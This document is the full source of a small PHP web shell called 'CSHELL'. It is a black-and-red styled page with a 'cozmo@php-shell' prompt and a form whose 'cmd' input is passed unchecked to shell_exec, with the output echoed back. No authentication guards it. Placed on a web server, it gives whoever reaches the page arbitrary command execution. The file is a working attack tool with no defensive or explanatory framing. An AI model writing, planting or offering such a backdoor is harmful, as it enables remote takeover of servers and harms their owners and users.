<!DOCTYPE html>
<head>
  <meta charset="utf-8">
  <title>CSH</title>
</head>
<body>
<h1>CSHELL</h1>
<hr color="red">
<main class="sh">
<form method="post">
<p>cozmo@php-shell:~#<input type="text" class="cm" name="cmd">
<input type="submit" class="acao" name="run" value="run"/></p>
</form>

<style>
h1 {
   color: white;
   font-family: Fantasy;
}
body {
   background-color: black;
}
.sh{
    // width: 980px;
    // height: 700px;  
     background-color: black;
     border-radius: 10px;
     border-color: #bbb;
 }
 p {
     color: white;
     font-family: Verdana;
 }
 .cm {
     background-color: black;
     border-color: red;
     color: #00BFFF;
 }
 .acao {
     background-color: black;
     border-color: red;
     border-radius: 6px;
     color: yellow;
 }
 .saida{
    color: #00FF00;
    font-size: 16px;
    font-family: Monospace;
 }
 </style>
 <p class="saida">
 <?php
 if(isset($_POST["run"])){
     $comando = $_POST["cmd"];
     $exec = shell_exec($comando);
     echo $exec."<br>";
 }
 ?>
 </p>
 <hr color="red">
 </main>
 
 </body>
 </html>
